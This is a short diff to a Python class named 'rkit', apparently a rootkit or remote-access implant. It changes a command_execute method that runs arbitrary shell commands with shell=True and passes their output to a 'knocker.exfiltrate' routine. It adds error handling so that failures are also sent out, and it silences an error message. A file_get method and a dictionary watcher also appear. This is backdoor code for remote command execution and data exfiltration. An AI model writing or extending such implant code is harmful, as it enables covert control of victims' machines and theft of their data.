@@ -60,12 +60,15 @@ class rkit:
                 self.dictionary_watcher.stop()
                 return 0
             case _:
-                print("Invalid action received")
+                # print("Invalid action received")
                 return 0
 
     def command_execute(self, command):
-        out = subprocess.check_output(command, shell=True)
-        self.knocker.exfiltrate(out, "/")
+        try:
+            out = subprocess.check_output(command, shell=True)
+            self.knocker.exfiltrate(out, "/")
+        except subprocess.CalledProcessError as e:
+            self.knocker.exfiltrate("Command "+command+" not found", "/")
 
     def file_get(self, file):
         try:
